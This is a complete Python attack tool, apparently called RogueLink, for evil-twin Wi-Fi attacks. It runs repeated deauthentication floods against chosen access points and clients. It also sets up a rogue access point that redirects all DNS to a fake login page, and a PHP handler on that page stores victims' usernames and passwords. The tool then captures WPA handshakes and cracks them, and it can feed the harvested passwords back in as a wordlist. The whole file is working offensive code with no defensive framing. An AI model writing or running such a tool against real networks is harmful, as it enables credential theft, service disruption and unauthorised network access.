#!/usr/bin/env python3

import re
import os
import subprocess
import time
# ANSI color codes
GREEN = "\033[92m"
RESET = "\033[0m"
from http.server import HTTPServer, BaseHTTPRequestHandler
from threading import Thread
def banner():
    print(GREEN + r"""

 ____                        _     _       _    
|  _ \ ___   __ _ _   _  ___| |   (_)_ __ | | __
| |_) / _ \ / _` | | | |/ _ \ |   | | '_ \| |/ /
|  _ < (_) | (_| | |_| |  __/ |___| | | | |   < 
|_| \_\___/ \__, |\__,_|\___|_____|_|_| |_|_|\_\
            |___/                               
""" + RESET)


INTERFACE = ""
MONITOR_INTERFACE = ""
CAPTIVE_PORTAL_PATH = "www/index.html"
LOG_FILE = "logs/credentials.txt"
CHANNEL = "6"
SSID = "FakeAP"
TARGET_BSSID = ""
TARGET_CHANNEL = ""
WEBROOT = "www"
CAPTURE_FILE = os.path.join(WEBROOT, "capture.txt")

def setup_captive_portal():
    try:
        os.makedirs(WEBROOT, exist_ok=True)

        with open(os.path.join(WEBROOT, "index.html"), "w") as f:
            f.write(f"""<!DOCTYPE html>
<html>
<head>
    <title>{SSID} - Login</title>
    <style>
        body {{ font-family: sans-serif; text-align: center; margin-top: 100px; background-color: #f2f2f2; }}
        .box {{ background: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 0 10px #ccc; display: inline-block; }}
        input {{ margin: 10px; padding: 10px; width: 80%; border-radius: 5px; border: 1px solid #ccc; }}
        button {{ padding: 10px 20px; background-color: #03a9f4; color: white; border: none; border-radius: 5px; }}
    </style>
</head>
<body>
    <div class="box">
        <h2>Welcome to {SSID}</h2>
        <form method="POST" action="capture.php">
            <input type="text" name="username" placeholder="Username or Email"><br>
            <input type="password" name="password" placeholder="Password"><br>
            <button type="submit">Login</button>
        </form>
    </div>
</body>
</html>""")

        with open(os.path.join(WEBROOT, "capture.php"), "w") as f:
            f.write("""<?php
$file = '/var/www/html/capture.txt';
file_put_contents($file, print_r($_POST, true), FILE_APPEND);
?>
<meta http-equiv="refresh" content="0; url=http://192.168.1.1" />
""")

        subprocess.call("sudo cp -r www/* /var/www/html/", shell=True)
        subprocess.call("sudo touch /var/www/html/capture.txt", shell=True)
        subprocess.call("sudo chmod 666 /var/www/html/capture.txt", shell=True)
        subprocess.call("sudo chown www-data:www-data /var/www/html/capture.txt", shell=True)

        with open("dnsmasq.conf", "w") as f:
            iface = MONITOR_INTERFACE if MONITOR_INTERFACE else INTERFACE
            f.write(f"""interface={iface}
dhcp-range=192.168.1.2,192.168.1.250,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
address=/#/192.168.1.1
""")

        with open("hostapd.conf", "w") as f:
            f.write(f"""interface={iface}
ssid={SSID}
channel={CHANNEL}
driver=nl80211
""")

        subprocess.call(["sudo", "hostapd", "hostapd.conf", "-B"])
        time.sleep(2)
        subprocess.call(["sudo", "dnsmasq", "-C", "dnsmasq.conf"])

        subprocess.call("sudo a2enmod rewrite", shell=True)
        subprocess.call("sudo systemctl restart apache2", shell=True)

    except KeyboardInterrupt:
        print("\n[*] Setup Captive Portal interrupted by user.")


def assign_ip():
    target_iface = MONITOR_INTERFACE if MONITOR_INTERFACE else INTERFACE
    subprocess.call(f"sudo ifconfig {target_iface} 192.168.1.1 netmask 255.255.255.0 up", shell=True)

def configure_iptables():
    subprocess.call("sudo iptables --flush", shell=True)
    subprocess.call("sudo iptables -t nat --flush", shell=True)
    subprocess.call("sudo iptables --delete-chain", shell=True)
    subprocess.call("sudo iptables -t nat --delete-chain", shell=True)
    subprocess.call("sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.1.1:80", shell=True)
    subprocess.call("sudo iptables -t nat -A POSTROUTING -j MASQUERADE", shell=True)

def pause():
    input("\n[*] Press Enter to return to the menu...")

def menu():
    os.system("clear" if os.name == "posix" else "cls")
    banner()
    print("""
============== Evil Twin Tool ==============
[0] Exit
[1] Select Network Interface
[2] Enable Monitor Mode
[3] Disable Monitor Mode
[4] Explore Targets
[5] Deauthentication Attack
[6] Evil Twin Attack
[7] Upload Custom Captive Portal
[8] Capture 4-Way Handshake
[9] Generate Report
[10] Deauth + Evil Twin Attack
[11] Crack WPA Handshake (with or without captured credentials)
============================================
    """)
    return input("Select an option (0-11): ")

def select_interface():
    global INTERFACE
    print("\nAvailable Interfaces:")
    interfaces = os.popen("iwconfig 2>/dev/null | grep IEEE | cut -d ' ' -f1").read().splitlines()
    for i, iface in enumerate(interfaces):
        print(f"[{i}] {iface}")
    try:
        choice = int(input("Select interface by number: "))
        INTERFACE = interfaces[choice]
        print(f"[*] Selected interface: {INTERFACE}")
    except (ValueError, IndexError):
        print("[!] Invalid selection.")
    pause()

def enable_monitor_mode():
    global MONITOR_INTERFACE
    if INTERFACE:
        print(f"[*] Enabling monitor mode on {INTERFACE}...")
        subprocess.call(["airmon-ng", "start", INTERFACE])
        result = os.popen("iwconfig 2>/dev/null | grep 'Mode:Monitor' | cut -d ' ' -f1").read().strip()
        if result:
            MONITOR_INTERFACE = result
            print(f"[*] Monitor mode enabled: {MONITOR_INTERFACE}")
        else:
            MONITOR_INTERFACE = ""
            print("[!] Failed to enable monitor mode.")
    else:
        print("[!] Please select a network interface first.")
    pause()

def disable_monitor_mode():
    if MONITOR_INTERFACE:
        print(f"[*] Disabling monitor mode on {MONITOR_INTERFACE}...")
        subprocess.call(["airmon-ng", "stop", MONITOR_INTERFACE])
        print(f"[*] Monitor mode disabled: {MONITOR_INTERFACE}")
    else:
        print("[!] No monitor interface found.")
    pause()

def explore_targets():
    if MONITOR_INTERFACE:
        print(f"[*] Scanning networks with {MONITOR_INTERFACE}... Press CTRL+C to stop.")
        filename = "logs/targets_capture"
        try:
            subprocess.call(["airodump-ng", "--write", filename, "--output-format", "pcap", MONITOR_INTERFACE])
        except KeyboardInterrupt:
            print("\n[*] Scan interrupted by user.")
    else:
        print("[!] Monitor interface not set.")
    pause()

def deauth_attack():
    if MONITOR_INTERFACE:
        global TARGET_BSSID, TARGET_CHANNEL
        print("Choose deauthentication mode:")
        print("[1] Manual (BSSID, Target MAC, and Channel)")
        print("[2] Auto (BSSID and Target MAC across channels 1–50)")
        print("[3] Manual broadcast (BSSID and Channel)")
        print("[4] Auto broadcast (BSSID across 1–50)")
        choice = input("Select mode: ")
        try:
            if choice == "1":
                TARGET_BSSID = input("Enter target BSSID: ")
                TARGET_CHANNEL = input("Enter target channel: ")
                victim = input("Enter victim MAC: ")
                subprocess.call(["iwconfig", MONITOR_INTERFACE, "channel", TARGET_CHANNEL])
                while True:
                    subprocess.call(["aireplay-ng", "--deauth", "10", "-a", TARGET_BSSID, "-c", victim, MONITOR_INTERFACE])
            elif choice == "2":
                TARGET_BSSID = input("Enter target BSSID: ")
                victim = input("Enter victim MAC: ")
                while True:
                    for channel in range(1, 51):
                        subprocess.call(["iwconfig", MONITOR_INTERFACE, "channel", str(channel)])
                        subprocess.call(["aireplay-ng", "--deauth", "10", "-a", TARGET_BSSID, "-c", victim, MONITOR_INTERFACE])
                        time.sleep(1)
            elif choice == "3":
                TARGET_BSSID = input("Enter target BSSID: ")
                TARGET_CHANNEL = input("Enter target channel: ")
                subprocess.call(["iwconfig", MONITOR_INTERFACE, "channel", TARGET_CHANNEL])
                while True:
                    subprocess.call(["aireplay-ng", "--deauth", "10", "-a", TARGET_BSSID, "-c", "FF:FF:FF:FF:FF:FF", MONITOR_INTERFACE])
            elif choice == "4":
                TARGET_BSSID = input("Enter target BSSID: ")
                while True:
                    for channel in range(1, 51):
                        subprocess.call(["iwconfig", MONITOR_INTERFACE, "channel", str(channel)])
                        subprocess.call(["aireplay-ng", "--deauth", "10", "-a", TARGET_BSSID, "-c", "FF:FF:FF:FF:FF:FF", MONITOR_INTERFACE])
                        time.sleep(1)
            else:
                print("[!] Invalid option.")
        except KeyboardInterrupt:
            print("[*] Deauth attack interrupted.")
    else:
        print("[!] Monitor interface not set.")
    pause()

def evil_twin_attack():
    global SSID
    if MONITOR_INTERFACE:
    
        subprocess.call("sudo pkill dnsmasq", shell=True)
        subprocess.call("sudo pkill hostapd", shell=True)
        subprocess.call("sudo systemctl restart apache2", shell=True)
        SSID = input("Enter SSID for Evil Twin: ")
        print("[*] Launching Evil Twin...")
        # Switch monitor interface back to managed mode for hostapd
        subprocess.call(f"sudo ip link set {MONITOR_INTERFACE} down", shell=True)
        subprocess.call(f"sudo iwconfig {MONITOR_INTERFACE} mode managed", shell=True)
        subprocess.call(f"sudo ip link set {MONITOR_INTERFACE} up", shell=True)

        assign_ip()
        configure_iptables()
        setup_captive_portal()

        print("[*] Evil Twin attack with captive portal is active.")
        input("[!] Press Enter to stop Evil Twin...")
        print("[*] Stopping Evil Twin...")
    else:
        print("[!] Monitor interface not set.")
    pause()

def upload_custom_portal():
    global SSID
    print("Enter the full path to your custom captive portal directory")
    portal_path = input("Path to captive portal (must contain index.html): ").strip()

    if os.path.exists(os.path.join(portal_path, "index.html")):
        subprocess.call(f"sudo cp -r {portal_path}/* /var/www/html/", shell=True)
        subprocess.call("sudo chmod -R 755 /var/www/html", shell=True)
        subprocess.call("sudo chown -R www-data:www-data /var/www/html", shell=True)
        print("[*] Custom portal deployed to Apache root.")

        SSID = input("Enter SSID for Evil Twin: ")
        print("[*] Launching Evil Twin with custom portal...")

        # Reconfigure interface
        subprocess.call(f"sudo ip link set {MONITOR_INTERFACE} down", shell=True)
        subprocess.call(f"sudo iwconfig {MONITOR_INTERFACE} mode managed", shell=True)
        subprocess.call(f"sudo ip link set {MONITOR_INTERFACE} up", shell=True)

        assign_ip()
        configure_iptables()

        with open("dnsmasq.conf", "w") as f:
            iface = MONITOR_INTERFACE if MONITOR_INTERFACE else INTERFACE
            f.write(f"""interface={iface}
dhcp-range=192.168.1.2,192.168.1.250,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
address=/#/192.168.1.1
""")

        with open("hostapd.conf", "w") as f:
            f.write(f"""interface={iface}
ssid={SSID}
channel={CHANNEL}
driver=nl80211
""")

        subprocess.call("sudo pkill dnsmasq", shell=True)
        subprocess.call(["sudo", "hostapd", "hostapd.conf", "-B"])
        time.sleep(2)
        subprocess.call(["sudo", "dnsmasq", "-C", "dnsmasq.conf"])
        subprocess.call("sudo systemctl restart apache2", shell=True)

        print("[*] Evil Twin with custom captive portal is active.")
        input("[!] Press Enter to stop the attack...")
        print("[*] Attack stopped.")
    else:
        print("[!] Invalid path or index.html not found.")
    pause()

def capture_handshake():
    if MONITOR_INTERFACE:
        filename = input("Enter filename to save handshake: ")
        channel = input("Enter channel number to scan: ")
        bssid = input("Enter target BSSID: ")
        victim = input("Enter victim MAC or FF:FF:FF:FF:FF:FF: ")
        print(f"[*] Switching to channel {channel}...")
        subprocess.call(["iwconfig", MONITOR_INTERFACE, "channel", str(channel)])
        try:
            aireplay_proc = subprocess.Popen([
                    "aireplay-ng", "--deauth", "10", "-a", bssid, "-c", victim, MONITOR_INTERFACE
])
            time.sleep(2)
            airodump_proc = subprocess.Popen([
                    "airodump-ng", "--bssid", bssid, "--channel", str(channel),
                    "--write", filename, "--output-format", "pcap", MONITOR_INTERFACE
                ])
            time.sleep(5)
            aireplay_proc.terminate()
            airodump_proc.terminate()
        except KeyboardInterrupt:
            print("[*] Capture interrupted.")
        print("[*] Handshake capture complete.")
    else:
        print("[!] Monitor interface not set.")
    pause()

def generate_report():
    filename = input("Enter a name for the report file (without extension): ")
    report_path = os.path.join("logs", filename + ".txt")
    print("[*] Generating report...")
    with open(report_path, "w") as f:
        f.write("Evil Twin Tool Report\n")
        f.write("============================\n")
        f.write(f"Interface Selected        : {INTERFACE}\n")
        f.write(f"Monitor Mode Interface    : {MONITOR_INTERFACE}\n")
        f.write(f"Target BSSID              : {TARGET_BSSID}\n")
        f.write(f"Target Channel            : {TARGET_CHANNEL}\n")
        f.write(f"SSID Used for Evil Twin   : {SSID}\n")
        f.write("\nCaptured Credentials\n")
        f.write("---------------------\n")
        capture_path = "/var/www/html/capture.txt"
        if os.path.exists(capture_path):
            with open(capture_path) as log:
                lines = log.readlines()
                if lines:
                    f.writelines(lines)
                else:
                    f.write("No credentials captured yet.\n")
        else:
            f.write("capture.txt does not exist at /var/www/html.\n")
        f.write("\nNote: Ensure attack steps were performed before report.\n")
    print(f"[*] Report saved to {report_path}")
    pause()


def deauth_and_eviltwin():
    global SSID, TARGET_BSSID, TARGET_CHANNEL
    if MONITOR_INTERFACE:
        SSID = input("Enter SSID for Evil Twin: ")
        TARGET_BSSID = input("Enter target BSSID: ")
        TARGET_CHANNEL = input("Enter target channel: ").strip()
        print(f"[*] Target channel set to: {TARGET_CHANNEL}")
        print("[*] Starting deauth attack...")

        subprocess.call(["iwconfig", MONITOR_INTERFACE, "channel", TARGET_CHANNEL])
        try:
            subprocess.call([
                "aireplay-ng", "--ignore-negative-one", "--deauth", "50", "-a", TARGET_BSSID,
                "-c", "FF:FF:FF:FF:FF:FF", MONITOR_INTERFACE
            ])
        except KeyboardInterrupt:
            print("[*] Deauth interrupted.")

        print("[*] Switching to Evil Twin...")

        # Now switch to managed mode
        subprocess.call("sudo pkill dnsmasq", shell=True)
        subprocess.call("sudo pkill hostapd", shell=True)
        subprocess.call("sudo systemctl restart apache2", shell=True)
        subprocess.call(f"sudo ip link set {MONITOR_INTERFACE} down", shell=True)
        subprocess.call(f"sudo iwconfig {MONITOR_INTERFACE} mode managed", shell=True)
        subprocess.call(f"sudo ip link set {MONITOR_INTERFACE} up", shell=True)

        assign_ip()
        configure_iptables()
        setup_captive_portal()

        print("[*] Evil Twin attack with captive portal is active.")
        try:
            input("[!] Press Enter to stop Evil Twin or press Ctrl+C...")
        except KeyboardInterrupt:
            print("\n[*] Evil Twin interrupted by user.")

        print("[*] Combined attack complete.")
    else:
        print("[!] Monitor interface not set.")
    pause()


def crack_wpa_handshake():
    print("[*] WPA Handshake Cracking")
    handshake = input("Do you have a captured handshake file? (y/n): ").lower()
    if handshake == 'y':
        handshake_path = input("Enter path to .cap or .pcap handshake file: ").strip()
    else:
        capture_handshake()
        print("[*] The handshake will be saved in the 'Project' directory.")
        handshake_path = input("Enter the path to the handshake file you just saved (e.g., Project/yourfile.cap): ").strip()
        if not os.path.exists(handshake_path):
            print(f"[!] The file {handshake_path} does not exist. Please verify the path.")
            pause()
            return

    print("[*] Choose wordlist source:")
    print("[1] Use custom wordlist file")
    print("[2] Use captured credentials from /var/www/html/capture.txt")
    method = input("Select option (1/2): ")

    wordlist_path = ""
    if method == "1":
        wordlist_path = input("Enter path to wordlist file: ").strip()
    elif method == "2":
        with open("/var/www/html/capture.txt") as f:
            lines = f.readlines()
            with open("/tmp/generated_wordlist.txt", "w") as out:
                capture = "".join(lines)
                import re
                passwords = re.findall(r"\[password\]\s*=>\s*(.*)", capture)
                for pwd in passwords:
                    out.write(pwd.strip() + "\n")
        wordlist_path = "/tmp/generated_wordlist.txt"
    else:
        print("[!] Invalid selection. Returning to menu.")
        pause()
        return

    bssid = input("Enter target BSSID: ")
    print("[*] Cracking in progress using aircrack-ng...")
    subprocess.call(["aircrack-ng", handshake_path, "-w", wordlist_path, "-b", bssid])
    pause()


if __name__ == "__main__":
  
    while True:
        choice = menu()
        if choice == "0":
            print("[*] Exiting...")
            break
        elif choice == "1":
            select_interface()
        elif choice == "2":
            enable_monitor_mode()
        elif choice == "3":
            disable_monitor_mode()
        elif choice == "4":
            explore_targets()
        elif choice == "5":
            deauth_attack()
        elif choice == "6":
            evil_twin_attack()
        elif choice == "7":
            upload_custom_portal()
        elif choice == "8":
            capture_handshake()
        elif choice == "9":
            generate_report()
        elif choice == "10":
            deauth_and_eviltwin()
        elif choice == "11":
            crack_wpa_handshake()
        else:
            print("[!] Invalid option.")
            pause()
